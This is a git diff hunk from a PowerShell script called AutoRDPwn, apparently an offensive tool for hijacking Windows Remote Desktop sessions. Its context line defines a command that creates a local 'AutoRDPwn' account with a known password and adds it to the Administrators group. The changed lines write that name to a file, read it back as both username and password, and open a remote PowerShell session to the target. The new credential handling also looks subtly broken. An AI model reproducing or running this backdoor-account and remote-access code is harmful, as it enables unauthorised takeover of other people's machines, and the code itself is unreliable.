@@ -178,7 +178,8 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
       } until ($input -in '1','2','3','4','5')
 
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""
-   if ($hash) { $PlainTextPassword = ConvertFrom-SecureToPlain $password ; $user="AutoRDPwn" ; $password="AutoRDPwn" }
+   if ($hash) { echo "AutoRDPwn" > credentials.dat }
+   $user = type credentials.dat ; $password = type credentials.dat ; del credentials.dat
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
    $RDP = New-PSSession -Computer $computer -credential $credential      
    $Host.UI.RawUI.ForegroundColor = 'Yellow'
